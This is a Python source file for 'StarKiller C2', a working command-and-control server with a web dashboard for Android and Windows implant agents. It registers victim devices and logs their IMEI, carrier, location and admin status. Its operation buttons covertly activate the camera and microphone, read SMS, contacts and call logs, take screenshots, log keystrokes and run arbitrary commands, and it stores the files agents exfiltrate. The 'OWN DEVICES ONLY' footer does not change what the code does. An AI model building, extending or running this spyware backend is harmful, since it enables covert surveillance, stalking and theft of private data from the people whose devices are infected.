"""
STARKILLER C2 — Command & Control Server
22DIV / george wu

Web dashboard + agent listener. Accepts connections from both
StarKiller Android agents and VADER Windows agents (same protocol).

Usage:
    python starkiller_c2.py                 # dashboard :8666, agents :8667
    python starkiller_c2.py --port 9000     # custom dashboard port
"""
import os
import sys
import json
import socket
import struct
import subprocess
import threading
import time
import uuid
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from collections import deque

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(ROOT)
DASHBOARD_PORT = 8666
AGENT_PORT = 8667
DOWNLOADS_DIR = os.path.join(PROJECT_ROOT, "downloads")

console_buf = deque(maxlen=3000)
console_lock = threading.Lock()
agents = {}
agents_lock = threading.Lock()


def console_write(line):
    with console_lock:
        ts = datetime.now().strftime("%H:%M:%S")
        console_buf.append(f"[{ts}] {line}")


def agent_send(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def agent_recv(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))


def agent_handler(sock, addr):
    agent_id = None
    try:
        msg = agent_recv(sock)
        if not msg or msg.get("type") != "register":
            sock.close()
            return

        agent_id = msg.get("agent_id", uuid.uuid4().hex[:8])
        platform = msg.get("platform", "unknown")
        if "android" in msg.get("os", "").lower() or platform == "android":
            platform = "android"
        elif "windows" in msg.get("os", "").lower():
            platform = "windows"

        info = {
            "id": agent_id,
            "addr": f"{addr[0]}:{addr[1]}",
            "hostname": msg.get("hostname", "?"),
            "username": msg.get("username", "?"),
            "os": msg.get("os", "?"),
            "arch": msg.get("arch", "?"),
            "platform": platform,
            "model": msg.get("model", ""),
            "carrier": msg.get("carrier", ""),
            "battery": msg.get("battery", ""),
            "imei": msg.get("imei", ""),
            "defender": msg.get("defender", ""),
            "admin": msg.get("admin", False),
            "ip": msg.get("ip", addr[0]),
            "pid": msg.get("pid", 0),
            "sock": sock,
            "connected": True,
            "connected_at": datetime.now().strftime("%H:%M:%S"),
            "last_seen": time.time(),
            "last_gps": None,
        }

        with agents_lock:
            agents[agent_id] = info

        icon = "📱" if platform == "android" else "💻"
        console_write(f"[+] {icon} Agent connected: {info['hostname']} ({agent_id}) from {addr[0]}")
        if info["model"]:
            console_write(f"    Model: {info['model']} | Carrier: {info['carrier']} | Battery: {info['battery']}")

        while True:
            msg = agent_recv(sock)
            if msg is None:
                break

            msg_type = msg.get("type", "")

            if msg_type == "heartbeat":
                with agents_lock:
                    if agent_id in agents:
                        agents[agent_id]["last_seen"] = time.time()
                        if "battery" in msg:
                            agents[agent_id]["battery"] = msg["battery"]
                        if "gps" in msg:
                            agents[agent_id]["last_gps"] = msg["gps"]

            elif msg_type == "output":
                line = msg.get("line", "")
                console_write(f"  [{info['hostname']}] {line}")

            elif msg_type == "result":
                status = msg.get("status", "?")
                task_id = msg.get("task_id", "?")
                icon = "+" if status == "ok" else "!"
                console_write(f"[{icon}] [{info['hostname']}] Task {task_id}: {status}")
                data = msg.get("data")
                if data and isinstance(data, dict):
                    if "error" in data:
                        console_write(f"  [{info['hostname']}] Error: {data['error']}")
                    if "gps" in data:
                        with agents_lock:
                            if agent_id in agents:
                                agents[agent_id]["last_gps"] = data["gps"]

            elif msg_type == "file_data":
                raw = base64.b64decode(msg.get("data", ""))
                task_id = msg.get("task_id", "?")
                filename = msg.get("filename", f"agent_{agent_id}_{task_id}.bin")
                os.makedirs(DOWNLOADS_DIR, exist_ok=True)
                fpath = os.path.join(DOWNLOADS_DIR, filename)
                with open(fpath, "wb") as f:
                    f.write(raw)
                console_write(f"[+] [{info['hostname']}] File saved: {filename} ({len(raw)} bytes)")

    except (ConnectionResetError, ConnectionAbortedError, OSError):
        pass
    except Exception as e:
        console_write(f"[!] Agent handler error: {e}")
    finally:
        if agent_id:
            with agents_lock:
                if agent_id in agents:
                    agents[agent_id]["connected"] = False
                    agents[agent_id]["sock"] = None
            console_write(f"[-] Agent disconnected: {agent_id}")
        try:
            sock.close()
        except Exception:
            pass


def agent_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", AGENT_PORT))
    except OSError as e:
        console_write(f"[!] Agent listener failed: {e}")
        return
    srv.listen(16)
    console_write(f"[*] Agent listener on 0.0.0.0:{AGENT_PORT}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=agent_handler, args=(conn, addr), daemon=True).start()
        except Exception:
            pass


def dispatch_task(agent_id, op, **kwargs):
    with agents_lock:
        info = agents.get(agent_id)
        if not info or not info.get("connected") or not info.get("sock"):
            return {"error": "Agent not connected"}

    task_id = uuid.uuid4().hex[:6]
    task = {"type": "task", "id": task_id, "op": op, **kwargs}

    try:
        agent_send(info["sock"], task)
        console_write(f"[>] Dispatched {op} to {info['hostname']} (task {task_id})")
        return {"ok": True, "task_id": task_id}
    except Exception as e:
        return {"error": str(e)}


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>STARKILLER — C2</title>
<style>
:root {
    --bg: #0a0a0a; --bg2: #111; --bg3: #1a1a1a; --border: #222;
    --green: #00FF41; --amber: #FFB000; --red: #FF4444;
    --blue: #4488FF; --pink: #FF2D8A; --purple: #9966FF;
    --dim: #555; --muted: #888; --text: #ccc; --white: #fff;
}
* { margin:0; padding:0; box-sizing:border-box; }
body {
    background:var(--bg); color:var(--text);
    font-family:'JetBrains Mono','Cascadia Code','Fira Code','Consolas',monospace;
    font-size:13px; height:100vh; overflow:hidden;
}
.layout { display:grid; grid-template-columns:300px 1fr; grid-template-rows:auto 1fr auto; height:100vh; }
header {
    grid-column:1/-1; background:var(--bg2); border-bottom:1px solid var(--border);
    padding:12px 20px; display:flex; align-items:center; gap:20px;
}
.logo { color:var(--red); font-weight:bold; font-size:18px; letter-spacing:2px; }
.logo-sub { color:var(--dim); font-size:11px; }
.header-info { margin-left:auto; display:flex; gap:16px; align-items:center; }
.tag { padding:2px 8px; border-radius:3px; font-size:10px; font-weight:bold; }
.tag-green { background:rgba(0,255,65,0.15); color:var(--green); }
.tag-red { background:rgba(255,68,68,0.15); color:var(--red); }
.tag-purple { background:rgba(153,102,255,0.15); color:var(--purple); }

.sidebar { background:var(--bg2); border-right:1px solid var(--border); overflow-y:auto; }
.section-title {
    padding:12px 16px 6px; font-size:10px; font-weight:bold; letter-spacing:2px;
    border-bottom:1px solid var(--border); margin-bottom:4px;
}

.agent-item {
    display:flex; align-items:center; gap:8px; padding:6px 16px;
    cursor:pointer; transition:background 0.15s; border-bottom:1px solid rgba(34,34,34,0.5);
}
.agent-item:hover { background:var(--bg3); }
.agent-item.selected { background:var(--bg3); border-left:3px solid var(--red); }
.agent-dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
.agent-dot.alive { background:var(--green); box-shadow:0 0 6px var(--green); }
.agent-dot.dead { background:var(--red); }
.agent-platform { font-size:14px; }
.agent-host { font-size:11px; color:var(--white); }
.agent-meta { font-size:9px; color:var(--dim); }
.agent-id { font-size:10px; color:var(--red); font-weight:bold; margin-left:auto; }

.ops-grid { display:grid; grid-template-columns:1fr 1fr; gap:4px; padding:8px 12px; }
.op-btn {
    background:var(--bg3); border:1px solid var(--border); color:var(--text);
    font-family:inherit; font-size:10px; padding:7px 4px; border-radius:4px;
    cursor:pointer; transition:all 0.15s; text-align:center;
}
.op-btn:hover { border-color:var(--red); color:var(--red); background:rgba(255,68,68,0.05); }
.op-btn:active { transform:scale(0.97); }
.op-btn.full { grid-column:1/-1; }

.agent-detail { padding:8px 16px; font-size:11px; }
.detail-row { display:flex; justify-content:space-between; padding:2px 0; }
.detail-label { color:var(--dim); }
.detail-val { color:var(--white); }
.detail-val.android { color:var(--green); }
.detail-val.windows { color:var(--blue); }

.main { display:flex; flex-direction:column; overflow:hidden; }
.console-header {
    background:var(--bg2); border-bottom:1px solid var(--border);
    padding:8px 16px; display:flex; align-items:center; gap:12px;
}
.console-header h3 { font-size:11px; letter-spacing:2px; color:var(--dim); font-weight:bold; }
.console-op { font-size:11px; color:var(--amber); font-weight:bold; }
.console-clear {
    margin-left:auto; background:none; border:1px solid var(--border);
    color:var(--dim); font-family:inherit; font-size:10px; padding:2px 10px;
    border-radius:3px; cursor:pointer;
}
.console-clear:hover { border-color:var(--red); color:var(--red); }
.console {
    flex:1; overflow-y:auto; padding:12px 16px;
    font-size:12px; line-height:1.6; background:var(--bg);
}
.console .line { white-space:pre-wrap; word-break:break-all; }
.console .line.ok { color:var(--green); }
.console .line.err { color:var(--red); }
.console .line.warn { color:var(--amber); }
.console .line.sep { color:var(--dim); }
.console .ts { color:var(--dim); margin-right:4px; font-size:10px; }

footer {
    grid-column:1/-1; background:var(--bg2); border-top:1px solid var(--border);
    padding:6px 20px; display:flex; align-items:center; gap:20px; font-size:11px;
}
.footer-label { color:var(--dim); }

::-webkit-scrollbar { width:6px; }
::-webkit-scrollbar-track { background:var(--bg); }
::-webkit-scrollbar-thumb { background:var(--dim); border-radius:3px; }
</style>
</head>
<body>
<div class="layout">
    <header>
        <div>
            <div class="logo">STARKILLER</div>
            <div class="logo-sub">ANDROID C2</div>
        </div>
        <span class="logo-sub">22DIV / george wu</span>
        <div class="header-info">
            <span class="tag tag-green" id="statusTag">LISTENING</span>
            <span style="color:var(--dim)">AGENTS: <span id="agentCount" style="color:var(--white)">0</span></span>
        </div>
    </header>

    <div class="sidebar">
        <div class="section-title" style="color:var(--red)">AGENTS</div>
        <div id="agentPanel">
            <div style="color:var(--dim);font-size:11px;padding:12px 16px">Waiting for connections on :8667...</div>
        </div>

        <div id="agentDetailSection" style="display:none">
            <div class="section-title" style="color:var(--purple)">DEVICE INFO</div>
            <div class="agent-detail" id="agentDetail"></div>
        </div>

        <div id="agentOpsSection" style="display:none">
            <div class="section-title" style="color:var(--amber)">OPERATIONS</div>
            <div class="ops-grid">
                <button class="op-btn" onclick="agentOp('sysinfo')">📱 SYSINFO</button>
                <button class="op-btn" onclick="agentOp('gps')">📍 GPS</button>
                <button class="op-btn" onclick="agentOp('camera')">📷 CAMERA</button>
                <button class="op-btn" onclick="agentOp('mic')">🎙 MIC</button>
                <button class="op-btn" onclick="agentOp('sms_read')">💬 SMS</button>
                <button class="op-btn" onclick="agentOp('contacts')">👤 CONTACTS</button>
                <button class="op-btn" onclick="agentOp('calllog')">📞 CALLS</button>
                <button class="op-btn" onclick="agentOp('apps')">📦 APPS</button>
                <button class="op-btn" onclick="agentOp('screenshot')">🖥 SCREEN</button>
                <button class="op-btn" onclick="agentOp('notifs')">🔔 NOTIFS</button>
                <button class="op-btn" onclick="agentOp('ls')">📁 FILES</button>
                <button class="op-btn" onclick="agentOp('exec')">⚡ EXEC</button>
                <button class="op-btn" onclick="agentOp('keylog')">⌨ KEYLOG</button>
                <button class="op-btn" onclick="agentOp('ping')">🏓 PING</button>
                <button class="op-btn full" style="border-color:var(--red);color:var(--red)" onclick="agentOp('recon')">FULL RECON</button>
            </div>
        </div>
    </div>

    <div class="main">
        <div class="console-header">
            <h3>CONSOLE</h3>
            <span class="console-op" id="opStatus"></span>
            <button class="console-clear" onclick="clearConsole()">CLEAR</button>
        </div>
        <div class="console" id="console"></div>
    </div>

    <footer>
        <div style="display:flex;align-items:center;gap:6px">
            <span class="footer-label">DASHBOARD</span>
            <span style="color:var(--white)">:8666</span>
        </div>
        <div style="display:flex;align-items:center;gap:6px">
            <span class="footer-label">AGENTS</span>
            <span style="color:var(--white)">:8667</span>
        </div>
        <div style="margin-left:auto;display:flex;align-items:center;gap:6px">
            <span class="footer-label">TARGET</span>
            <span style="color:var(--amber)">OWN DEVICES ONLY</span>
        </div>
    </footer>
</div>

<script>
let selectedAgent = null;
let lastConsoleLen = 0;

function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function classForLine(t) {
    if (t.includes('[+]')) return 'ok';
    if (t.includes('[!]')) return 'err';
    if (t.includes('[~]') || t.includes('[>]')) return 'warn';
    if (/^[═─]{3,}/.test(t.replace(/\[.*?\]\s*/,''))) return 'sep';
    return '';
}

function renderAgents(list) {
    const panel = document.getElementById('agentPanel');
    const detailSec = document.getElementById('agentDetailSection');
    const opsSec = document.getElementById('agentOpsSection');
    document.getElementById('agentCount').textContent = list.filter(a=>a.connected).length;

    if (!list.length) {
        panel.innerHTML = '<div style="color:var(--dim);font-size:11px;padding:12px 16px">Waiting for connections on :8667...</div>';
        detailSec.style.display = 'none';
        opsSec.style.display = 'none';
        return;
    }

    panel.innerHTML = list.map(a => {
        const icon = a.platform === 'android' ? '📱' : '💻';
        return `<div class="agent-item ${selectedAgent===a.id?'selected':''}" onclick="selectAgent('${a.id}')">
            <div class="agent-dot ${a.connected?'alive':'dead'}"></div>
            <span class="agent-platform">${icon}</span>
            <div>
                <div class="agent-host">${escHtml(a.hostname||a.model||'?')}</div>
                <div class="agent-meta">${escHtml(a.username||'')} · ${escHtml(a.ip||'')} ${a.admin?'(ROOT)':''}</div>
            </div>
            <span class="agent-id">${a.id}</span>
        </div>`;
    }).join('');

    const sel = list.find(a => a.id === selectedAgent);
    if (sel) {
        detailSec.style.display = 'block';
        opsSec.style.display = 'block';
        const pclass = sel.platform === 'android' ? 'android' : 'windows';
        document.getElementById('agentDetail').innerHTML = [
            ['Platform', sel.platform, pclass],
            ['OS', sel.os, ''],
            ['Model', sel.model || '—', ''],
            ['Carrier', sel.carrier || '—', ''],
            ['Battery', sel.battery || '—', ''],
            ['IP', sel.ip, ''],
            ['Connected', sel.connected_at, ''],
        ].map(([l,v,c]) => `<div class="detail-row"><span class="detail-label">${l}</span><span class="detail-val ${c}">${escHtml(String(v))}</span></div>`).join('');
    } else {
        detailSec.style.display = 'none';
        opsSec.style.display = 'none';
    }
}

function selectAgent(id) {
    selectedAgent = selectedAgent === id ? null : id;
    fetchAgents();
}

function renderConsole(lines) {
    const el = document.getElementById('console');
    const wasBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 40;
    if (lines.length !== lastConsoleLen) {
        const newLines = lines.slice(lastConsoleLen);
        const frag = document.createDocumentFragment();
        newLines.forEach(l => {
            const div = document.createElement('div');
            div.className = 'line ' + classForLine(l);
            const m = l.match(/^\[(\d{2}:\d{2}:\d{2})\]\s*/);
            if (m) div.innerHTML = `<span class="ts">${m[1]}</span>${escHtml(l.slice(m[0].length))}`;
            else div.textContent = l;
            frag.appendChild(div);
        });
        el.appendChild(frag);
        lastConsoleLen = lines.length;
        if (wasBottom) el.scrollTop = el.scrollHeight;
    }
}

async function fetchAgents() {
    try {
        const r = await fetch('/api/agents');
        const d = await r.json();
        renderAgents(d.agents||[]);
    } catch(e) {}
}

async function fetchConsole() {
    try {
        const r = await fetch('/api/console');
        const d = await r.json();
        renderConsole(d.lines||[]);
    } catch(e) {}
}

async function agentOp(op) {
    if (!selectedAgent) return;
    let body = {op};

    if (op === 'exec') {
        const cmd = prompt('Command to execute:');
        if (!cmd) return;
        body.cmd = cmd;
    } else if (op === 'ls') {
        const path = prompt('Directory path:', '/sdcard');
        if (path === null) return;
        body.path = path || '/sdcard';
    } else if (op === 'camera') {
        body.camera = confirm('Use front camera?') ? 'front' : 'rear';
    } else if (op === 'mic') {
        const dur = prompt('Recording duration (seconds):', '10');
        if (!dur) return;
        body.duration = parseInt(dur) || 10;
    } else if (op === 'sms_send') {
        const to = prompt('Phone number:');
        if (!to) return;
        const msg = prompt('Message:');
        if (!msg) return;
        body.to = to;
        body.message = msg;
    }

    try {
        await fetch('/api/agents/' + selectedAgent + '/task', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body),
        });
    } catch(e) {}
}

async function clearConsole() {
    await fetch('/api/clear', {method:'POST'});
    document.getElementById('console').innerHTML = '';
    lastConsoleLen = 0;
}

fetchAgents();
fetchConsole();
setInterval(fetchAgents, 2000);
setInterval(fetchConsole, 400);
</script>
</body>
</html>"""


class StarKillerHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/":
            self._html(DASHBOARD_HTML)
        elif path == "/api/console":
            with console_lock:
                lines = list(console_buf)
            self._json({"lines": lines})
        elif path == "/api/agents":
            with agents_lock:
                agent_list = []
                stale = []
                for aid, a in agents.items():
                    if not a["connected"] and time.time() - a.get("last_seen", 0) > 300:
                        stale.append(aid)
                        continue
                    agent_list.append({
                        "id": a["id"], "hostname": a["hostname"], "username": a["username"],
                        "ip": a["ip"], "os": a.get("os", "?"), "platform": a.get("platform", "?"),
                        "model": a.get("model", ""), "carrier": a.get("carrier", ""),
                        "battery": a.get("battery", ""), "admin": a.get("admin", False),
                        "connected": a["connected"], "connected_at": a.get("connected_at", "?"),
                        "last_gps": a.get("last_gps"),
                    })
                for aid in stale:
                    del agents[aid]
            self._json({"agents": agent_list})
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/clear":
            with console_lock:
                console_buf.clear()
            self._json({"ok": True})

        elif path.startswith("/api/agents/") and path.endswith("/task"):
            agent_id = path.split("/")[3]
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length)) if length else {}
            except Exception:
                body = {}
            op = body.pop("op", "")
            if not op:
                self._json({"error": "Missing 'op'"}, 400)
                return
            result = dispatch_task(agent_id, op, **body)
            self._json(result, 200 if "ok" in result else 400)

        elif path.startswith("/api/agents/") and path.endswith("/kill"):
            agent_id = path.split("/")[3]
            with agents_lock:
                info = agents.get(agent_id)
            if info and info.get("sock"):
                try:
                    agent_send(info["sock"], {"type": "task", "id": "kill", "op": "exit"})
                    info["sock"].close()
                except Exception:
                    pass
                console_write(f"[-] Killed agent {agent_id}")
                self._json({"ok": True})
            else:
                self._json({"error": "Not found"}, 404)
        else:
            self.send_response(404)
            self.end_headers()


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=DASHBOARD_PORT)
    parser.add_argument("--agent-port", type=int, default=AGENT_PORT)
    args = parser.parse_args()

    global AGENT_PORT
    AGENT_PORT = args.agent_port

    console_write("StarKiller C2 initialised")
    console_write(f"Dashboard: http://0.0.0.0:{args.port}")
    console_write(f"Agent listener: 0.0.0.0:{AGENT_PORT}")
    console_write(f"{'─'*50}")
    console_write("Awaiting agent connections...")

    threading.Thread(target=agent_listener, daemon=True).start()

    server = HTTPServer(("0.0.0.0", args.port), StarKillerHandler)

    R = "\033[38;2;255;68;68m"
    G = "\033[38;2;0;255;65m"
    D = "\033[38;2;85;85;85m"
    W = "\033[38;2;255;255;255m"
    X = "\033[0m"

    print(f"""
{R}  ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
  ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
  ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
  ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
  ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝{X}
{D}  ──────────────────────────────────────────────────────────────────────────────{X}
{D}  22DIV{D} // {W}george wu{D} // {R}Android C2{X}
{D}  ──────────────────────────────────────────────────────────────────────────────{X}

{G}  [*]{X} Dashboard:      {W}http://0.0.0.0:{args.port}{X}
{G}  [*]{X} Agent listener: {W}0.0.0.0:{AGENT_PORT}{X}
{D}  [*] Ctrl+C to stop{X}
""")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{D}  The dark side awaits.{X}\n")
        server.shutdown()


if __name__ == "__main__":
    main()
